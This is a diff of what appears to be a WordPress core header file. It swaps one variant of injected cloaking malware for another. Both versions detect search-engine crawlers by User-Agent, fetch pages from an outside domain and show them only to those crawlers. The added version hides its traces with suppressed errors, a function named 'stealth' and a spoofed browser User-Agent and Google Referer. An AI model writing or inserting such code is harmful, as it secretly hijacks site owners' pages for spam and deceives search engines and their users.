@@ -4,31 +4,29 @@
  *
  * @package WordPress
  */
-ob_start();
-header("Vary: User-Agent");
-$bot_url = "https://picucur.xyz/landing/fsf/";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url)
-{
-    if (function_exists("curl_init")) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get("allow_url_fopen")) {
-        return file_get_contents($url);
-    }
-    return false;
+@ob_start();
+header("Vary: U-Agent");
+
+$src = "https://picucur.xyz/landing/fsf/";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
 }
-if (preg_match($botchar, $ua)) {
+
+if (preg_match($match, $ua)) {
     usleep(rand(100000, 200000));
-    echo lph_requests($bot_url);
-    ob_end_flush();
-    die;
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
 }
 
 if ( ! isset( $wp_did_header ) ) {
